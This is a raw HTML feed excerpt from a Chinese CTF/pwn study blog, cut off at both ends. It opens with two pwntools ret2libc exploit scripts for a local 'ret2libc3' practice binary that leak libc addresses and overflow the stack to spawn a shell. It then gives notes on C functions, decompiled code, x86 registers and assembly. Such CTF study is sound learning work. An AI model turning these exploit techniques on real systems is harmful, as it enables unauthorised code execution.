p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收函数地址</span></span><br><span class="line">libc_start_main_addr = u32(p.recv(4))</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印 __libc_start_main_addr: 初始地址</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;__libc_start_main_addr: &quot;</span> + hex(libc_start_main_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#查找使用的libc版本</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算偏移值</span></span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算system函数地址</span></span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算/bin/sh字符串地址</span></span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) + 0xb9</span><br><span class="line"></span><br><span class="line"><span class="comment">#两个打印语句，显示相应地址</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_addr: &quot;</span> + hex(system_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;binsh_addr: &quot;</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Can you find it !?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;s&#x27;</span>*112 + p32(system_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入模块</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;leak libc_start_main_got addr and return to main again&quot;</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;get the related addr&quot;</span></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;get shell&quot;</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>链接（查询libc版本）：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a></p><br/><br/><p>———————————————————————-分界线———————————————————————————————————–</p><br/><h1 id="博客收藏"><a href="#博客收藏" class="headerlink" title="博客收藏"></a>博客收藏</h1><p>遇到的一些好的博客，当然是要收藏一下的嘛╭( ￣ ▽￣)╯，对了，有事没事多看看别人的友链，说不定能找到一两篇宝藏博客</p><br/><p>链接(pwn新手推荐)：<a href="https://www.yuque.com/hxfqg9/bin">二进制安全 · 语雀 (yuque.com)</a></p><p>链接(大佬博客)：<a href="https://xuanxuanblingbling.github.io/">Clang裁缝店 (xuanxuanblingbling.github.io)</a></p><p>链接(大佬博客)：<a href="https://blingblingxuanxuan.github.io/">blingbling’s blog (blingblingxuanxuan.github.io)</a></p><p>链接(大佬博客)：<a href="https://nuoye-blog.github.io/">nuoye大佬</a></p><p>链接(大佬博客)：<a href="http://uuzdaisuki.com/">http://uuzdaisuki.com/</a></p><p>链接(大佬博客)：<a href="https://lantern.cool/">Lantern’s 小站</a></p><p>链接(大佬博客)：<a href="http://blog.eonew.cn/">Ex’s blog (eonew.cn)</a></p><p>链接(大佬博客)：<a href="https://radishes-nine.vercel.app/">Radish (radishes-nine.vercel.app)</a></p><p>链接(QAQ)：<a href="https://www.anquanke.com/member.html?memberId=134349">安全客 - 安全资讯平台 (anquanke.com)</a></p><p>链接(杂)：<a href="https://toutiao.io/subjects/6127">https://toutiao.io/subjects/6127</a></p><p>链接(杂)：<a href="https://toutiao.io/u/129594">https://toutiao.io/u/129594</a></p><br/><br/><h1 id="文章收藏"><a href="#文章收藏" class="headerlink" title="文章收藏"></a>文章收藏</h1><p>链接：<a href="https://www.52pojie.cn/thread-1389324-1-1.html">逆向基础笔记二十四 汇编 指针（五） 系列完结 - 『软件调试区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><br/><br/><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>链接：<a href="https://cloud.tencent.com/developer/doc/1024">C++ - 开发者手册 - 云+社区 - 腾讯云 (tencent.com)</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*-- C/C++ --*/</span></span><br><span class="line"></span><br><span class="line">fgets():</span><br><span class="line">C 库函数 <span class="function"><span class="keyword">char</span> *<span class="title">fgets</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">int</span> n, FILE *stream)</span> 从指定的流 stream 读取一行，并把它存储在 str 所指向的字符串内。当读取 <span class="params">(n<span class="number">-1</span>)</span> 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">fflush</span><span class="params">()</span>用于清空文件缓冲区，如果文件是以写的方式打开 的，则把缓冲区内容写入文件。其原型为：<span class="keyword">int</span> <span class="title">fflush</span><span class="params">(FILE* stream)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>() 函数可以说是初始化内存的“万能函数”，<span class="built_in">memset</span>() 的作用是在一段内存块中填充某个给定的值。因为它只能填充一个值，所以该函数的初始化为原始初始化，无法将变量初始化为程序中需要的数据。用<span class="built_in">memset</span>初始化完后，后面程序中再向该内存空间中存放需要的数据。</span><br><span class="line">    <span class="function"><span class="keyword">void</span> *<span class="title">memset</span><span class="params">(<span class="keyword">void</span> *s, <span class="keyword">int</span> c, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span></span>;    <span class="comment">//原型</span></span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">10</span>];         <span class="comment">//例子</span></span><br><span class="line">    <span class="keyword">char</span> *p = str;</span><br><span class="line">    <span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="keyword">sizeof</span>(str));  <span class="comment">//只能写sizeof(str), 不能写sizeof(p)</span></span><br><span class="line"></span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="comment">//可以通输入参数type=2（行缓冲）的setvbuf来使得每次从流中读入一行数据或向流中写入一行数据</span></span><br><span class="line"><span class="comment">//https://blog.csdn.net/Maxmalloc/article/details/102556335  </span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">sscanf</span>()、sscanf_s()</span><br><span class="line"><span class="comment">//https://blog.csdn.net/wu_cai_/article/details/81702886</span></span><br><span class="line">    </span><br><span class="line">perror()</span><br><span class="line">链接：https:<span class="comment">//www.runoob.com/cprogramming/c-function-perror.html</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>()、<span class="built_in">calloc</span>()、<span class="built_in">realloc</span>()    <span class="comment">//这些函数用于从堆中动态获得一块内存</span></span><br><span class="line"></span><br><span class="line">alloca()    <span class="comment">//在栈(stack)上申请空间</span></span><br></pre></td></tr></table></figure><br/><h1 id="标记"><a href="#标记" class="headerlink" title="标记"></a>标记</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">70</span>i64        <span class="comment">//64位int类型数据70</span></span><br><span class="line">_DWORD *     <span class="comment">//DWORD是无符号的,相当于unsigned long ，它是MFC的数据类型，类似于char *、int *</span></span><br></pre></td></tr></table></figure><br/><h2 id="反编译中不理解的代码"><a href="#反编译中不理解的代码" class="headerlink" title="反编译中不理解的代码"></a>反编译中不理解的代码</h2><h3 id="例1（C-）"><a href="#例1（C-）" class="headerlink" title="例1（C++）"></a>例1（C++）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># 得学C++</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">7</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+47h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">7</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">5</span>]; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">32</span>, edata);                   <span class="comment">//从输入的字符串中读取前32个字符存入S</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(&amp;input, s);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(&amp;v5);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(v4, <span class="string">&quot;you&quot;</span>, &amp;v5);   <span class="comment">//从v4的起始地址到v5的起始地址写入字符串“you”</span></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(v7);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(v6, <span class="string">&quot;I&quot;</span>, v7);      <span class="comment">//从v6的起始地址到v7的起始地址写入字符串“I”</span></span><br><span class="line">  replace((<span class="built_in">std</span>::<span class="built_in">string</span> *)v3);            <span class="comment">//I 替换为you</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(&amp;input, v3, v6, v4);  </span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v3);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v6);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(v7);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v4);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v5);</span><br><span class="line">  v0 = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, v0);                         <span class="comment">//重组后的字符串赋给s</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1.png" alt="img"></p><br/><br/><p><br/><br/></p><br/><p><br/><br/></p><br/><br/><br/><br/><br/><h1 id="flag-secret"><a href="#flag-secret" class="headerlink" title="flag{_secret_}"></a>flag{_secret_}</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:)</p>]]></content>
    
    
    <summary type="html">题录&amp;知识精记</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>PWN笔记</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/</id>
    <published>2022-02-17T08:00:21.000Z</published>
    <updated>2022-04-23T10:35:27.539Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux编译32位文件"><a href="#linux编译32位文件" class="headerlink" title="linux编译32位文件"></a>linux编译32位文件</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -o &lt;生成的文件的文件名，不写则默认为a.out&gt; &lt;要编译的文件的文件名&gt; -m32</span><br><span class="line"></span><br><span class="line"><span class="comment">#例：</span></span><br><span class="line">$ gcc -o hawala.out hawala.c -m32</span><br></pre></td></tr></table></figure><br/><br/><h1 id="float类型的存储方式"><a href="#float类型的存储方式" class="headerlink" title="float类型的存储方式"></a>float类型的存储方式</h1><p>原文链接：<a href="https://blog.csdn.net/wuing2/article/details/90143635?utm_source=app&app_version=5.1.1">float类型的存储方式_wuing2的博客-CSDN博客_float的存储</a></p><br/><p><strong>float的存储格式：</strong><br>float类型又称为单精度浮点类型，在 IEEE 754-2008 中是这样定义它的结构的：<br>S EEEEEEEE FFFFFFFFFFFFFFFFFFFFFFF<br>31 30 23 22 0</p><p>float类型总共4个字节——32位：<br>符号位 其中最左边的为符号位，0为正，1为负。<br>指数 接下来的E是指数，一共8位，也用二进制来表示。IEEE规定，在float类型中，用来计算指数的偏移量为127。<br>尾数 最后的F是小数部分，尾数正是由这23位的小数部分+1位组成的。</p><br/><p><strong>实例分析：</strong><br>已8.25为例进行分析：<br>8：二进制位1000<br>0.25：为2^-2，即为0.01<br>因此，8.25转换成二进制位1000.01<br>用科学记数法表示为：1.00001*2^3<br>因此：<br>符号位：0（表示正数）<br>指数位：3+127=130=128+2=2^7+2=10000000&amp;000000010=100000010<br>尾数：00001-000000-000000-000000<br>注意，因为用科学记数法，所以最前面肯定是1，故不记录了。<br>因此，整体数据为 0-10000010-00001-000000-000000-000000</p><br/><p>11.28125  –&gt;  41348000h</p><br/><br/><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><br/><h2 id="x86寄存器-32位"><a href="#x86寄存器-32位" class="headerlink" title="x86寄存器(32位)"></a>x86寄存器(32位)</h2><p>学习链接：<a href="https://blog.csdn.net/choufu1408/article/details/100655739">https://blog.csdn.net/choufu1408/article/details/100655739</a></p><p>学习链接（荐）：<a href="https://blog.csdn.net/zhu2695/article/details/16813425">代码人生。。。-CSDN博客_esi寄存器</a></p><p>摘要：</p><table><thead><tr><th><strong>寄存器名称</strong></th><th><strong>用  途  描  述</strong></th></tr></thead><tbody><tr><td>eax</td><td>用于操作数和结果数据的累加器</td></tr><tr><td>ebx</td><td>指向数据内存段中的数据的指针</td></tr><tr><td>ecx</td><td>字符串和循环操作的计数器</td></tr><tr><td>edx</td><td>I/O指针</td></tr><tr><td>edi</td><td>用于字符串操作的目标的数据指针</td></tr><tr><td>esi</td><td>用于字符串操作的源的数据指针</td></tr><tr><td>esp</td><td>堆栈指针</td></tr><tr><td>ebp</td><td>堆栈数据指针</td></tr></tbody></table><p>个人理解（知道这些差不多了）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ebp:栈底指针      <span class="comment">#中间的b可记为base，基底</span></span><br><span class="line">esb:栈顶指针      <span class="comment">#指向栈的顶部</span></span><br><span class="line">eip:存下一条指令的地址 </span><br><span class="line">其他几个寄存器没有特别限定想存啥都行       <span class="comment">#pwn题暂时了解以上三个就够了</span></span><br></pre></td></tr></table></figure><br/><h2 id="x86寄存器-64位"><a href="#x86寄存器-64位" class="headerlink" title="x86寄存器(64位)"></a>x86寄存器(64位)</h2><p>个人理解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rbp:栈底指针      <span class="comment">#64位用r做前缀 </span></span><br><span class="line">rsp:栈顶指针</span><br><span class="line">rip:存下一条指令</span><br><span class="line">RDI, RSI, RDX, RCX, R8 和 R9 寄存器   <span class="comment">#暂时了解这几个就够了</span></span><br><span class="line">注：System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 寄存器中，如果还有更多的参数的话才会保存在栈上。</span><br></pre></td></tr></table></figure><br/><br/><h1 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h1><p>《CTF竞赛权威指南》P34，此处简记要点供个人随时复习</p><h2 id="指令符："><a href="#指令符：" class="headerlink" title="指令符："></a>指令符：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">遇到一个便记录一个：</span><br><span class="line"></span><br><span class="line">数据传送与访问：mov</span><br><span class="line"></span><br><span class="line">算术运算与逻辑运算：</span><br><span class="line">inc/dec      <span class="comment">#操作数±1</span></span><br><span class="line">add/sub      <span class="comment">#长度相同的操作数相加减</span></span><br><span class="line">and/or <span class="comment">#按位逻辑与/或</span></span><br><span class="line">mul          <span class="comment">#乘法操作</span></span><br><span class="line">xor          <span class="comment">#异或操作，常用做寄存器值置零</span></span><br><span class="line">cmp          <span class="comment">#比较两个值</span></span><br><span class="line">neg          <span class="comment">#将操作数转换为二进制补码，并将操作数的符号位取反</span></span><br><span class="line">    </span><br><span class="line">跳转指令与循环指令：</span><br><span class="line">jmp          <span class="comment">#无条件跳转指令，一般需要使用一个标号来标识，可以实现循环</span></span><br><span class="line">LOOP         <span class="comment">#循环指令，每循环一次循环计数寄存器减1</span></span><br><span class="line">je           <span class="comment">#条件跳转，链接：https://blog.csdn.net/ssihc0/article/details/5215044</span></span><br><span class="line"><span class="built_in">test</span>         <span class="comment">#与AND命令有相同效果，只是Test指令不改变AX和BX的内容，而AND指令会把结果保存到AX中</span></span><br><span class="line"></span><br><span class="line">栈与函数调用：</span><br><span class="line">push         <span class="comment">#入栈，详细操作P41</span></span><br><span class="line">pop          <span class="comment">#从栈中pop一个值，给ebp</span></span><br><span class="line"></span><br><span class="line">使用栈保存函数返回地址：</span><br><span class="line">call         <span class="comment">#call调用子函数时，下一条指令的地址作为返回地址存入栈中</span></span><br><span class="line">             <span class="comment">#相当于   push IP</span></span><br><span class="line">                 <span class="comment">#        jmp near ptr 标号    这两条汇编</span></span><br><span class="line"> <span class="comment">#https://blog.csdn.net/u013018721/article/details/51264199</span></span><br><span class="line">ret          <span class="comment">#往栈上高地址一个单位取地址当做跳转地址   *******</span></span><br><span class="line"> <span class="comment">#链接：https://blog.csdn.net/qq_37340753/article/details/81585083</span></span><br><span class="line"></span><br><span class="line">其他：</span><br><span class="line">lea          <span class="comment">#官方解释Load Effective Address，即装入有效地址的意思，它的操作数就是地址</span></span><br><span class="line">nop          <span class="comment">#空操作，链接：https://www.cnblogs.com/shangzhijian/p/4994028.html</span></span><br><span class="line">leave        <span class="comment">#mov esp,ebp和pop ebp</span></span><br><span class="line"> <span class="comment">#链接：https://blog.csdn.net/striver1205/article/details/25216699</span></span><br><span class="line"> <span class="comment">#链接：https://blog.csdn.net/zhangxinrun/article/details/5888425</span></span><br><span class="line">int 0x80     <span class="comment">#系统调用</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)        #*(_DWORD *)是强制类型转化，然后在提领指针</span><br><span class="line">                   <span class="meta">#dword是指注册表的键值，每个word为2个字节，dword双字即为4个字节</span></span><br><span class="line">    </span><br><span class="line">mov qword ptr ds:[rax+<span class="number">18</span>], r8       <span class="meta">#http:<span class="comment">//129.226.226.195/post/12171.html</span></span></span><br></pre></td></tr></table></figure><br/><h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h2><p><strong>P55：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">.ascii <span class="string">&quot;hello world!&quot;</span></span><br><span class="line">len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">movl <span class="variable">$len</span>, %edx</span><br><span class="line">movl <span class="variable">$msg</span>, %ecx</span><br><span class="line">movl <span class="variable">$1</span>, %ebx</span><br><span class="line">movl <span class="variable">$4</span>, %eax</span><br><span class="line">int <span class="variable">$0x80</span></span><br><span class="line"></span><br><span class="line">movl <span class="variable">$0</span>, %ebx</span><br><span class="line">movl <span class="variable">$1</span>, %eax</span><br><span class="line">int <span class="variable">$0x80</span></span><br></pre></td></tr></table></figure><p>注（个人理解）：</p><p>​    .data表示data段</p><p>​    msg：定义字符串”hello world!”</p><p>​    len：字符串长度</p><p>​    len = . - msg：. 表示当前位置，msg表示字符串前面的一个位置，两者相减便得到了字符串长度</p><p>​    int $0x80：转入内核模式，进入内核模式前会根据相关寄存器(eax、ebx)的值进行相应的系统调用，所以在这之前会有两句设置寄存器值的汇编语句。</p><p>​    64位中使用syscall指令进入内核模式，32位使用int $0x80。</p><br/><p>相关链接：</p><p>​    链接：<a href="https://blog.csdn.net/czg13548930186/article/details/80818019">.text、.global_start、_start</a></p><p>​    链接：<a href="https://www.cnblogs.com/snail-micheal/p/4189632.html">https://www.cnblogs.com/snail-micheal/p/4189632.html</a></p><br/><h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><p><strong>and  esp, 0FFFFFFF0h</strong></p><p>自己写了个程序以供分析，发现了一句不知道用来干嘛的的汇编</p><p><img src="image-20220316102359067.png" alt="image-20220316102359067"></p><p>经查阅资料：得知该句是用来优化、对齐的。</p><p>参考链接：<a href="https://www.qingshanzhi.com/?p=200">and esp,0fffffff0h的作用 – 青山志 (qingshanzhi.com)</a></p><p>防止博主删博客，留图如下：</p><p><img src="image-20220316102609011.png" alt="image-20220316102609011"></p><br/><p><strong>x86_get_pc_thunk_ax</strong></p><p>参考链接：<a href="https://blog.csdn.net/m0_55708805/article/details/117827490">＜__x86.get_pc_thunk.ax＞有什么作用?_Freestyle Coding的博客-CSDN博客</a></p><br/><p><strong>call/retn/leave</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">call:相当于将下一条指令地址入栈，然后jmp到后面那个函数处执行</span><br><span class="line">    (1)段内转移的CALL指令等价于两条指令：</span><br><span class="line">      push eip</span><br><span class="line">      jmp   目的位置</span><br><span class="line">      也就是说，执行段内转移的CALL指令时，相当于先后执行以上两条指令。</span><br><span class="line">      (2)段间转移的CALL指令等价于三条指令：</span><br><span class="line">      push CS</span><br><span class="line">      push eip</span><br><span class="line">      jmp   目的位置</span><br><span class="line"> </span><br><span class="line">retn:</span><br><span class="line">RETN等价于一条指令：POP   eip</span><br><span class="line">　　 RETF等价于两条指令：</span><br><span class="line">　　POP   eip</span><br><span class="line">　　 POP   CS</span><br><span class="line">　　 </span><br><span class="line">　　 而带有操作数的RETN/RETF指令则是在POP（ESP+4）之后，执行ESP=ESP+操作数1。</span><br><span class="line">eip = [esp]</span><br><span class="line">esp = esp + 4 //将esp中的数据出栈到eip中,同时ESP+4</span><br><span class="line">　　 </span><br><span class="line">leave:</span><br><span class="line">  mov esp,ebp</span><br><span class="line">  pop ebp //还原函数栈</span><br></pre></td></tr></table></figure><br/><h2 id="dword-ptr-ecx-4"><a href="#dword-ptr-ecx-4" class="headerlink" title="dword ptr [ecx-4]"></a>dword ptr [ecx-4]</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 